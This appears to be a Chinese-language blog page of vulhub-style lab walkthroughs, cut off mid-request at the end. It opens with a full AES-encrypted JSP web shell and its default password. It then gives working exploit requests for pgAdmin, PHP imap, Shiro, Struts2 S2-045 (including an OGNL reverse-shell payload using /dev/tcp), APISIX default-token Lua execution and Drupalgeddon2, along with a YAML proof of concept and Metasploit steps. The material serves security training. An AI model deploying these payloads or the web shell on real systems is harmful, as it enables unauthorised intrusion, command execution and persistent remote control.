<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>连接密码为rebeyond</p>
<p>附：</p>
<p>详细通关教程：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/byt8563/article/details/107016312/" >https://blog.csdn.net/byt8563/article/details/107016312/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>kali下载蚁剑教程</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Bing_Geng/article/details/134451677" >https://blog.csdn.net/Bing_Geng/article/details/134451677</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="Pgadmin"   >
          <a href="#Pgadmin" class="heading-link"><i class="fas fa-link"></i></a><a href="#Pgadmin" class="headerlink" title="Pgadmin"></a>Pgadmin</h1>
      
        <h2 id="pgAdmin-lt-6-16无授权远程命令执行漏洞CVE-2022-4223"   >
          <a href="#pgAdmin-lt-6-16无授权远程命令执行漏洞CVE-2022-4223" class="heading-link"><i class="fas fa-link"></i></a><a href="#pgAdmin-lt-6-16无授权远程命令执行漏洞CVE-2022-4223" class="headerlink" title="pgAdmin&lt;=6.16无授权远程命令执行漏洞CVE-2022-4223"></a>pgAdmin&lt;=6.16无授权远程命令执行漏洞CVE-2022-4223</h2>
      <p>pgAdmin是一个著名的PostgreSQL数据库管理平台。</p>
<p>pgAdmin包含一个HTTP API可以用来让用户选择并验证额外的PostgreSQL套件，比如pg_dump和pg_restore。但在其6.16版本及以前，对于用户传入的路径没有做合适的验证，导致未授权的用户可以在目标服务器上执行任意命令。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406281409231.png" alt="image-20240628140918094"></p>
<p>首先抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406281410618.png" alt="image-20240628141044571"></p>
<p>直接将数据包修改为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /misc/validate_binary_path HTTP/1.1</span><br><span class="line">Host: your-ip:5050</span><br><span class="line">Content-Length: 27</span><br><span class="line">X-pgA-CSRFToken: [csrf-token]</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7</span><br><span class="line">Cookie: pga4_session=[session-id]</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;utility_path&quot;:&quot;a\&quot;;id;#&quot;&#125;</span><br></pre></td></tr></table></div></figure>

<p>提示说csrf token丢失，所以需要先获取一个新的session id和csrf token</p>
<p>重新抓包，发送数据包</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /login HTTP/1.1</span><br><span class="line">Host: your-ip:5050</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></div></figure>

<p>在返回包中拿到一个新的session id和csrf token</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406281425890.png" alt="image-20240628142532831"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406281426935.png" alt="image-20240628142608879"></p>
<p>将获取到的session id和csrf token填写进数据包并发送（这里做的时候出了点意外，又重新获取了一次seession id和csrf token，所以数据包里的内容和截图有区别）</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /misc/validate_binary_path HTTP/1.1</span><br><span class="line">Host: 192.168.162.131:5050</span><br><span class="line">X-pgA-CSRFToken: ImRjNjlkOWUzZmI0OTJjMTJmYTFmMjgxNWQ3NTBlNzRiYjBjMGFjNDIi.Zn5X8w.jdDVrCOV27AhWtX-UGB3jHYijHg</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7</span><br><span class="line">Cookie: pga4_session=0922425a-06b5-4097-894b-c447f1b58faf!Nu8KGbjMfuUw8a6M5A1M3WLKHdhmMaVRfCpcTPj8JrQ=</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">&#123;&quot;utility_path&quot;:&quot;a\&quot;;id;#&quot;&#125;</span><br></pre></td></tr></table></div></figure>

<p><code>id</code>命令执行成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406281430135.png" alt="image-20240628143007075"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">requests:</span><br><span class="line">  - method: GET</span><br><span class="line">    path:</span><br><span class="line">      - &quot;&#123;&#123;BaseURL&#125;&#125;/login&quot;</span><br><span class="line"></span><br><span class="line">    extractors:</span><br><span class="line">      - type: regex</span><br><span class="line">        name: session_id</span><br><span class="line">        group: 1</span><br><span class="line">        regex:</span><br><span class="line">          - &#x27;Set-Cookie: pga4_session=([^;]+);&#x27;</span><br><span class="line"></span><br><span class="line">      - type: regex</span><br><span class="line">        name: csrf_token</span><br><span class="line">        group: 1</span><br><span class="line">        regex:</span><br><span class="line">          - &#x27;name=&quot;csrf_token&quot; type=&quot;hidden&quot; value=&quot;([^&quot;]+)&quot;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  - method: POST</span><br><span class="line">    path:</span><br><span class="line">      - &quot;&#123;&#123;BaseURL&#125;&#125;/misc/validate_binary_path&quot;</span><br><span class="line">    headers:</span><br><span class="line">      X-pgA-CSRFToken: &quot;&#123;&#123;csrf_token&#125;&#125;&quot;</span><br><span class="line">      Cookie: &quot;pga4_session=&#123;&#123;session_id&#125;&#125;&quot;</span><br><span class="line">      Content-Type: &quot;application/json&quot;</span><br><span class="line">    </span><br><span class="line">    body: |</span><br><span class="line">      &#123;&quot;utility_path&quot;:&quot;a\&quot;;id;#&quot;&#125;</span><br><span class="line">    </span><br><span class="line">    matchers-condition: and</span><br><span class="line">    matchers:</span><br><span class="line">      - type: word</span><br><span class="line">        part: body</span><br><span class="line">        words:</span><br><span class="line">          - &quot;uid&quot;</span><br><span class="line">          - &quot;gid&quot;</span><br><span class="line">          - &quot;groups&quot;</span><br><span class="line">        condition: and</span><br><span class="line"></span><br><span class="line">      - type: status</span><br><span class="line">        status:</span><br><span class="line">          - 200</span><br></pre></td></tr></table></div></figure>

<p><span class="exturl"><a class="exturl__link"   href="E:\AH\poc\" >yaml式POC</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="PHP"   >
          <a href="#PHP" class="heading-link"><i class="fas fa-link"></i></a><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1>
      
        <h2 id="imap-远程命令执行漏洞CVE-2018-19518"   >
          <a href="#imap-远程命令执行漏洞CVE-2018-19518" class="heading-link"><i class="fas fa-link"></i></a><a href="#imap-远程命令执行漏洞CVE-2018-19518" class="headerlink" title="imap 远程命令执行漏洞CVE-2018-19518"></a>imap 远程命令执行漏洞CVE-2018-19518</h2>
      <p>php imap扩展用于在PHP中执行邮件收发操作。其<code>imap_open</code>函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。</p>
<p>因为ssh命令中可以通过设置<code>-oProxyCommand=</code>来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406281013276.png" alt="image-20240628101347140"></p>
<p>随便输入后点击“Submit”并抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406281034320.png"></p>
<p>将<code>hostname</code>字段的值修改为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d|base64%09-d|sh&#125;</span><br></pre></td></tr></table></div></figure>


        <h6 id="解释"   >
          <a href="#解释" class="heading-link"><i class="fas fa-link"></i></a><a href="#解释" class="headerlink" title="解释"></a>解释</h6>
      <p>使用url解码后为<code>x -oProxyCommand=echo    ZWNobyAnMTIzNDU2Nzg5MCc+L3RtcC90ZXN0MDAwMQo=|base64    -d|sh&#125;</code></p>
<p>其中<code>ZWNobyAnMTIzNDU2Nzg5MCc+L3RtcC90ZXN0MDAwMQo=</code>再用base64解码：<code>echo &#39;1234567890&#39;&gt;/tmp/test0001</code></p>
<p>通过<code>-oProxyCommand</code>参数执行命令，<code>x</code>可以是任意值</p>
<p>发包之后查看容器文件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker ps  //查看容器id</span><br><span class="line">sudo docker exec -i 容器id /bin/bash</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406281023041.png" alt="image-20240628102347984"></p>
<p>成功创建test0001文件并写入1234567890</p>

        <h5 id="反弹shell-1"   >
          <a href="#反弹shell-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#反弹shell-1" class="headerlink" title="反弹shell"></a>反弹shell</h5>
      
        <h1 id="Shiro"   >
          <a href="#Shiro" class="heading-link"><i class="fas fa-link"></i></a><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h1>
      
        <h2 id="CVE-2010-3863"   >
          <a href="#CVE-2010-3863" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2010-3863" class="headerlink" title="CVE-2010-3863"></a>CVE-2010-3863</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/../admin/</span><br></pre></td></tr></table></div></figure>




        <h2 id="CVE-2020-1957"   >
          <a href="#CVE-2020-1957" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2020-1957" class="headerlink" title="CVE-2020-1957"></a>CVE-2020-1957</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/x/..;/admin/</span><br></pre></td></tr></table></div></figure>

<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://drinkflower.asia/wordpress/archives/458" >https://drinkflower.asia/wordpress/archives/458</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="struts2"   >
          <a href="#struts2" class="heading-link"><i class="fas fa-link"></i></a><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h1>
      
        <h2 id="s2-045"   >
          <a href="#s2-045" class="heading-link"><i class="fas fa-link"></i></a><a href="#s2-045" class="headerlink" title="s2-045"></a>s2-045</h2>
      <p>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行。恶意用户可在上传文件时通过修改HTTP请求头中的<code>Content-Type</code>值来触发该漏洞，进而执行系统命令（Struts2框架执行了恶意用户传进来的OGNL表达式）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141441706.png" alt="image-20240614144133560"></p>

        <h5 id="验证"   >
          <a href="#验证" class="heading-link"><i class="fas fa-link"></i></a><a href="#验证" class="headerlink" title="验证"></a>验证</h5>
      <p>随便上传一个文件提交并抓包，发送到Repeater后，添加<code>Content-Type</code>，注意位置不要在最后面）</p>
<p>构造payload：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: %&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;vulhub&#x27;,233*233)&#125;.multipart/form-data</span><br></pre></td></tr></table></div></figure>

<p><code>%&#123;&#125;</code>：这是Struts2框架中用于解析OGNL表达式的标识符</p>
<p><code>#context</code>：这是OGNL上下文对象，包含了请求和响应相关的信息</p>
<p><code>[&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;]</code>：通过OGNL访问HTTP响应对象</p>
<p><code>.addHeader(&#39;vulhub&#39;,233*233)</code>：调用<code>addHeader</code>方法向HTTP响应头中添加一个名为<code>vulhub</code>的头，值为<code>233*233</code>的计算结果</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141442447.png" alt="image-20240614144258401"></p>
<p>发包之后看到成功执行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141444227.png" alt="image-20240614144400193"></p>

        <h5 id="使用工具连接反弹shell"   >
          <a href="#使用工具连接反弹shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#使用工具连接反弹shell" class="headerlink" title="使用工具连接反弹shell"></a>使用工具连接反弹shell</h5>
      <p>#msf</p>
<p>启动msf，搜索该漏洞</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search CVE-2017-5638</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141511781.png" alt="image-20240614151146692"></p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br></pre></td></tr></table></div></figure>

<p>使用这个模块</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141518652.png" alt="image-20240614151826617"></p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">options</span><br></pre></td></tr></table></div></figure>

<p>查看攻击需要配置的参数，其中Required中为<code>yes</code>的都是必须要设置其参数的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141601788.png" alt="image-20240614160152652"></p>
<p><code>RHOSTS</code>为靶机ip，<code>RPORT</code>为靶机端口，<code>TARGETURI</code>为攻击路径。<code>LHSOT</code>为攻击机ip，<code>LPORT</code>为攻击开启的监听端口，该端口必须是没有其它服务占用的。此处的<code>TARGETURI</code>来源于在靶场上传文件后的URL</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOSTS 靶机ip</span><br><span class="line"><span class="built_in">set</span> RPORT 8081</span><br><span class="line"><span class="built_in">set</span> TARGETURI doUpload.action</span><br></pre></td></tr></table></div></figure>

<p>设置好应该是这样</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141606314.png" alt="image-20240614160644277"></p>
<p>运行</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141608837.png" alt="image-20240614160834791"></p>
<p>先获取一个交互式的shell然后通过python命令来优化终端显示</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> </span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141612434.png" alt="image-20240614161207395"></p>
<p>#nc</p>
<p>开启监听</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 5555</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141640088.png" alt="image-20240614164041054"></p>
<p>抓包，将<code>Content-Type</code>修改为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: %&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;bash -i &gt;&amp; /dev/tcp/开启nc的主机ip/nc监听的端口 0&gt;&amp;1&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;b</span><br></pre></td></tr></table></div></figure>

<p>发包后可以看到反弹shell成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141641215.png" alt="image-20240614164147180"></p>
<p>附：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62008601/article/details/126082104" >https://blog.csdn.net/m0_62008601/article/details/126082104</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="Apisix"   >
          <a href="#Apisix" class="heading-link"><i class="fas fa-link"></i></a><a href="#Apisix" class="headerlink" title="Apisix"></a>Apisix</h1>
      
        <h2 id="CVE-2020-13945"   >
          <a href="#CVE-2020-13945" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2020-13945" class="headerlink" title="CVE-2020-13945"></a>CVE-2020-13945</h2>
      <p>Apache APISIX是一个高性能API网关。在用户未指定管理员Token或使用了默认配置文件的情况下，Apache APISIX将使用默认的管理员Token <code>edd1c9f034335f136f87ad84b625c8f1</code>，攻击者利用这个Token可以访问到管理员接口，进而通过<code>script</code>参数来插入任意LUA脚本并执行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141707487.png" alt="image-20240614170741445"></p>
<p>抓包，利用默认Token增加一个恶意的router，其中包含恶意LUA脚本</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /apisix/admin/routes HTTP/1.1</span><br><span class="line">Host: ip地址:9080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0</span><br><span class="line">Connection: close</span><br><span class="line">X-API-KEY: edd1c9f034335f136f87ad84b625c8f1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 408</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;uri&quot;: &quot;/attack&quot;,</span><br><span class="line">&quot;script&quot;: &quot;local _M = &#123;&#125; \n function _M.access(conf, ctx) \n local os = require(&#x27;os&#x27;)\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, &#x27;r&#x27;))\n local s = assert(f:read(&#x27;*a&#x27;))\n ngx.say(s)\n f:close()  \n end \nreturn _M&quot;,</span><br><span class="line">    &quot;upstream&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;roundrobin&quot;,</span><br><span class="line">        &quot;nodes&quot;: &#123;</span><br><span class="line">            &quot;example.com:80&quot;: 1</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>这个脚本主要包含一个模块，该模块在接收到HTTP请求时执行一个命令并返回结果</p>
<figure class="highlight lua"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> _M = &#123;&#125;  <span class="comment">-- 创建一个局部模块表</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_M.access</span><span class="params">(conf, ctx)</span></span>  <span class="comment">-- 定义模块的访问函数</span></span><br><span class="line">    <span class="keyword">local</span> <span class="built_in">os</span> = <span class="built_in">require</span>(<span class="string">&#x27;os&#x27;</span>)  <span class="comment">-- 引入os模块</span></span><br><span class="line">    <span class="keyword">local</span> args = <span class="built_in">assert</span>(ngx.req.get_uri_args())  <span class="comment">-- 获取并断言请求的URI参数</span></span><br><span class="line">    <span class="keyword">local</span> f = <span class="built_in">assert</span>(<span class="built_in">io</span>.<span class="built_in">popen</span>(args.cmd, <span class="string">&#x27;r&#x27;</span>))  <span class="comment">-- 打开一个由cmd参数指定的进程，并获取其输出</span></span><br><span class="line">    <span class="keyword">local</span> s = <span class="built_in">assert</span>(f:<span class="built_in">read</span>(<span class="string">&#x27;*a&#x27;</span>))  <span class="comment">-- 读取进程输出</span></span><br><span class="line">    ngx.say(s)  <span class="comment">-- 输出进程结果到客户端</span></span><br><span class="line">    f:<span class="built_in">close</span>()  <span class="comment">-- 关闭进程</span></span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> _M  <span class="comment">-- 返回模块</span></span><br></pre></td></tr></table></div></figure>

<p>发包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406170918837.png" alt="image-20240617091855780"></p>
<p>访问刚才添加的router，就可以通过cmd参数执行任意命令</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/attack?cmd=ls</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406170911203.png" alt="image-20240617091150168"></p>

        <h1 id="Drupal-Drupalgeddon-2远程代码执行漏洞"   >
          <a href="#Drupal-Drupalgeddon-2远程代码执行漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#Drupal-Drupalgeddon-2远程代码执行漏洞" class="headerlink" title="Drupal Drupalgeddon 2远程代码执行漏洞"></a>Drupal Drupalgeddon 2远程代码执行漏洞</h1>
      
        <h2 id="CVE-2018-7600"   >
          <a href="#CVE-2018-7600" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2018-7600" class="headerlink" title="CVE-2018-7600"></a>CVE-2018-7600</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406171448951.png" alt="image-20240617144842633"></p>
<p>安装drupal，数据库处选择SQLlite然后默认配置即可</p>
<p>安装完成之后长这个样子</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406171501559.png" alt="image-20240617150142477"></p>
<p>抓包发送到Repeater，修改请求包内容为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1</span><br><span class="line">Host: ip地址:8083</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://192.168.18.7:8088/user/register</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------99533888113153068481322586663</span><br><span class="line">Content-Length: 630</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------99533888113153068481322586663</span><br><span class="line">Content-Disposition: form-data; name=&quot;mail[#post_render][]&quot;</span><br><span class="line"></span><br><span class="line">passthru</span><br><span class="line">-----------------------------99533888113153068481322586663</span><br><span class="line">Content-Disposition: form-data; name=&quot;mail[#type]&quot;</span><br><span class="line"></span><br><span class="line">markup</span><br><span class="line">-----------------------------99533888113153068481322586663</span><br><span class="line">Content-Disposition: form-data; name=&quot;mail[#markup]&quot;</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">-----------------------------99533888113153068481322586663</span><br><span class="line">Content-Disposition: form-data; name=&quot;form_id&quot;</span><br><span class="line"></span><br><span 